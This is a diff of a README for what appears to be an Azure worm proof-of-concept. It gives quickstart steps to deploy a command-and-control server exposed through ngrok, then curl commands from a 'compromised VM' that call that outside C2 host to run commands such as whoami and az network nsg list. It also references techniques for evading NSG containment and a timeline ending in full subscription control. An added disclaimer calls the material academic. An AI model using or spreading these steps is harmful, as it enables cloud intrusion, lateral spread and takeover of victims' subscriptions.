@@ -21,16 +21,17 @@
 
 ## 🚀 Quickstart
 
-### 1. Deploy C2 (30 seconds)
-```bash
-git clone https://github.com/YOURUSERNAME/azure-worm-poc
-cd azure-worm-poc
-# Add your ngrok token to docker-compose.yml
-docker-compose up -d
-# Grab C2 URL from logs:
-docker-compose logs c2-server | grep ngrok
+# 1. Deploy C2 (30 seconds)
+    ```bash
+    git clone https://github.com/YOURUSERNAME/azure-worm-poc
+    cd azure-worm-poc
+    # Add your ngrok token to docker-compose.yml
+    docker-compose up -d
+    # Grab C2 URL from logs:
+    docker-compose logs c2-server | grep ngrok
 
-## From Compromised VM*
+
+##From Compromised VM
 
 # Replace with your C2 URL
 C2_URL="https://abc123.ngrok-free.app"
@@ -46,9 +47,6 @@ curl "${C2_URL}/exec?vm=WEB01&cmd=whoami"
 curl "${C2_URL}/exec?vm=WEB01&cmd=az%20network%20nsg%20list"
 
 ## 🎭 Evasion Techniques vs NSG Containment
-
-
-🎭 Evasion Techniques vs NSG Containment
 
 
 Defense                 Bypass
@@ -83,6 +81,16 @@ T+30s: Foothold executes propagate.py
 T+2m:  80% VM infection
 T+5m:  Full subscription control
 
+
+## DISCLAIMER
+
+The author does not endorse, support, or encourage the misuse of cloud platforms, security mechanisms, or computing resources.
+
+The contents of this directory are provided solely for academic discussion and threat modeling purposes. They are not intended to be executed, deployed, or adapted in any environment.
+
+Any attempt to run, modify, or use the contents of this directory would violate academic policy, cloud provider terms of service, and established ethical guidelines.
+
+The author accepts no responsibility or liability for any misuse, damage, policy violation, or legal consequences arising from the use or interpretation of the materials contained in this directory.
 
 
 
